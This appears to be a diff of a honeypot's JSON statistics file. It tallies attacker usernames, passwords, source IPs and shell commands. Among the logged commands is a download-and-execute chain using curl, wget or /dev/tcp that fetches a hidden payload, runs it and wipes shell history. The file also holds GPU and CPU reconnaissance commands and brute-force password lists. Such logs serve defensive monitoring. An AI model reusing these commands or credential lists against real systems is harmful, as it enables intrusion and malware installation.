@@ -1,11 +1,11 @@
 {
-  "LastUpdated": "2026-11-12T06:02:58.2466581Z",
-  "TotalUniqueUsernames": 135,
-  "TotalUniquePasswords": 292,
-  "TotalUniqueSourceIps": 194,
-  "TotalUniqueCommands": 1477,
+  "LastUpdated": "2026-11-12T07:03:05.5744306Z",
+  "TotalUniqueUsernames": 136,
+  "TotalUniquePasswords": 297,
+  "TotalUniqueSourceIps": 199,
+  "TotalUniqueCommands": 1479,
   "Usernames": {
-    "root": 159,
+    "root": 163,
     "admin": 83,
     "admin1": 4,
     "administrator": 7,
@@ -13,7 +13,7 @@
     "backup": 12,
     "centos": 4,
     "ethereum": 2,
-    "ubuntu": 24,
+    "ubuntu": 25,
     "debian": 9,
     "sol": 14,
     "solana": 8,
@@ -139,7 +139,8 @@
     "jolee": 1,
     "kailani": 1,
     "kalen": 1,
-    "kaliah": 1
+    "kaliah": 1,
+    "philip": 1
   },
   "Passwords": {
     "000000": 2,
@@ -154,7 +155,7 @@
     "1q2w3e4r": 4,
     "654321": 8,
     "P@ssw0rd": 7,
-    "admin": 16,
+    "admin": 17,
     "admin123": 5,
     "passw0rd": 5,
     "password": 10,
@@ -433,7 +434,12 @@
     "kailani": 1,
     "kalen": 1,
     "180790": 1,
-    "kaliah": 1
+    "kaliah": 1,
+    "CBhFuMAh": 1,
+    "philip": 1,
+    "Ubuntu@123": 1,
+    "FUsuyUjN": 1,
+    "kickpi": 1
   },
   "SourceIps": {
     "31.43.51.250": 4,
@@ -449,7 +455,7 @@
     "177.104.140.2": 34,
     "89.236.208.119": 2,
     "154.182.146.59": 4,
-    "193.141.127.102": 352,
+    "193.141.127.102": 546,
     "74.82.47.5": 2,
     "80.93.61.30": 4,
     "45.148.10.240": 5572,
@@ -622,14 +628,19 @@
     "103.124.99.229": 4,
     "27.21.91.254": 4,
     "119.148.49.82": 2,
-    "154.18.197.29": 360,
+    "154.18.197.29": 585,
     "58.182.58.128": 2,
     "36.253.9.128": 2,
     "187.192.65.125": 2,
     "85.217.149.71": 2,
     "188.170.120.122": 2,
     "35.210.20.53": 2,
-    "194.9.14.238": 2
+    "194.9.14.238": 2,
+    "172.232.253.221": 16,
+    "77.239.124.79": 44,
+    "202.46.68.66": 4,
+    "77.239.124.73": 44,
+    "65.49.1.172": 2
   },
   "FrequentCommands": {
     "sh -c \u0027printf \u0027\u0022\u0027\u0022\u0027\\n%s|%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_838e01f066c84f1e3d56106c05e7725b_small_control\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_838e01f066c84f1e3d56106c05e7725b\u0027\u0022\u0027\u0022\u0027\u0027": 1,
@@ -1491,14 +1502,14 @@
     "sh -c \u0027printf \u0027\u0022\u0027\u0022\u0027\\n%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_d51e77bbf56c940496df6b3b070f7a11_small_done\u0027\u0022\u0027\u0022\u0027\u0027": 1,
     "sh -c \u0027printf \u0027\u0022\u0027\u0022\u0027\\n%s|%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_3446d4fe3e5c8ab73214a47bb26c441e_small_control\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_3446d4fe3e5c8ab73214a47bb26c441e\u0027\u0022\u0027\u0022\u0027\u0027": 1,
     "sh -c \u0027printf \u0027\u0022\u0027\u0022\u0027\\n%s|%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_3446d4fe3e5c8ab73214a47bb26c441e_small_math\u0027\u0022\u0027\u0022\u0027 \u0022$((422*22\u002B94))\u0022\u0027": 1,
-    "uname -s -v -n -r -m": 7,
-    "nproc 2\u003E/dev/null || grep -c ^processor /proc/cpuinfo": 7,
-    "uptime 2\u003E/dev/null | awk -F\u0027( up |,|load)\u0027 \u0027{gsub(/^[ \\t]\u002B|[ \\t]\u002B$/,\u0022\u0022,$2); print $2}\u0027 | head -n1": 7,
-    "LC_ALL=C lscpu | awk -F: \u0027/Model name/ {gsub(/^[ \\t]\u002B/, \u0022\u0022, $2); print $2; exit}\u0027": 7,
-    "nvidia-smi -q | grep \u0022Product Name\u0022 | head -n 1 | awk \u0027{print $4, $5, $6, $7, $8, $9}\u0027 || echo \u0027No\u0027": 7,
-    "nvidia-smi -q | grep \u0022Attached GPUs\u0022 | awk \u0027{print $4}\u0027 \u0026\u0026 echo \u0027\u0027 || echo \u0027No\u0027": 7,
+    "uname -s -v -n -r -m": 9,
+    "nproc 2\u003E/dev/null || grep -c ^processor /proc/cpuinfo": 9,
+    "uptime 2\u003E/dev/null | awk -F\u0027( up |,|load)\u0027 \u0027{gsub(/^[ \\t]\u002B|[ \\t]\u002B$/,\u0022\u0022,$2); print $2}\u0027 | head -n1": 9,
+    "LC_ALL=C lscpu | awk -F: \u0027/Model name/ {gsub(/^[ \\t]\u002B/, \u0022\u0022, $2); print $2; exit}\u0027": 9,
+    "nvidia-smi -q | grep \u0022Product Name\u0022 | head -n 1 | awk \u0027{print $4, $5, $6, $7, $8, $9}\u0027 || echo \u0027No\u0027": 9,
+    "nvidia-smi -q | grep \u0022Attached GPUs\u0022 | awk \u0027{print $4}\u0027 \u0026\u0026 echo \u0027\u0027 || echo \u0027No\u0027": 9,
     "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027dWJ1bnR1QDEyMw==\u0027 | base64 -d \u003E \u0022$d/.wall_18010452\u0022; done": 1,
-    "curl -sSL http://{{HOST_1}}:{{PORT_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://{{HOST_1}}:{{PORT_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/{{HOST_1}}/{{PORT_1}} \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: 103.160.59.94\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 7,
+    "curl -sSL http://{{HOST_1}}:{{PORT_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://{{HOST_1}}:{{PORT_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/{{HOST_1}}/{{PORT_1}} \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: 103.160.59.94\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 9,
     "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027MTIzNDU2Nzg5\u0027 | base64 -d \u003E \u0022$d/.wall_03147916\u0022; done": 1,
     "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027c2hhcmU=\u0027 | base64 -d \u003E \u0022$d/.wall_03514532\u0022; done": 1,
     "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027cGFzc3dvcmQx\u0027 | base64 -d \u003E \u0022$d/.wall_05331022\u0022; done": 1,
@@ -2108,6 +2119,8 @@
     "sh -c \u0027printf \u0027\u0022\u0027\u0022\u0027\\n%s|%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_small_control\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea\u0027\u0022\u0027\u0022\u0027\u0027": 1,
     "sh -c \u0027printf \u0027\u0022\u0027\u0022\u0027\\n%s|%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_small_math\u0027\u0022\u0027\u0022\u0027 \u0022$((655*272\u002B43))\u0022\u0027": 1,
     "sh -c \u0027printf \u0027\u0022\u0027\u0022\u0027\\n%s|%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_small_pid\u0027\u0022\u0027\u0022\u0027 \u0022$$\u0022\u0027": 1,
-    "sh -c \u0027set -- \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_arg1\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_arg2\u0027\u0022\u0027\u0022\u0027; printf \u0027\u0022\u0027\u0022\u0027\\n%s|%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_small_positional\u0027\u0022\u0027\u0022\u0027 \u0022$#|$1|$2\u0022\u0027": 1
+    "sh -c \u0027set -- \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_arg1\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_arg2\u0027\u0022\u0027\u0022\u0027; printf \u0027\u0022\u0027\u0022\u0027\\n%s|%s\\n\u0027\u0022\u0027\u0022\u0027 \u0027\u0022\u0027\u0022\u0027check_a6207531e31a4446b9fb94c58de080ea_small_positional\u0027\u0022\u0027\u0022\u0027 \u0022$#|$1|$2\u0022\u0027": 1,
+    "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027VWJ1bnR1QDEyMw==\u0027 | base64 -d \u003E \u0022$d/.wall_06915271\u0022; done": 1,
+    "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027YWRtaW4=\u0027 | base64 -d \u003E \u0022$d/.wall_06943551\u0022; done": 1
   }
 }
